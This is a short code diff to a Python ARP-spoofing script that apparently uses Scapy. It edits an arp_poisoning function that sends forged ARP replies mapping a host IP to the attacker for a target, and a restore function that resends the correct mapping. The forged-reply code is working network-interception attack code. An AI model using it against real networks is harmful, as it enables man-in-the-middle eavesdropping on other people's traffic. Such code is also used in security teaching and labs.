@@ -28,7 +28,7 @@ def get_mac_address(ip_address: str):
     return None
 
 
-def arp_poisoning(target_mac, target_ip, host_ip, verbose=True):
+def arp_poisoning(target_mac, target_ip, host_ip):
     print("target_ip: ", target_ip, " host_ip:", host_ip)
     print("target_mac: ", target_mac)
     response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip)
@@ -36,5 +36,5 @@ def arp_poisoning(target_mac, target_ip, host_ip, verbose=True):
 
 
 def restore(target_mac, host_mac, target_ip, host_ip):
-    response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op='is-at')
+    response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
     send(response, count=7)
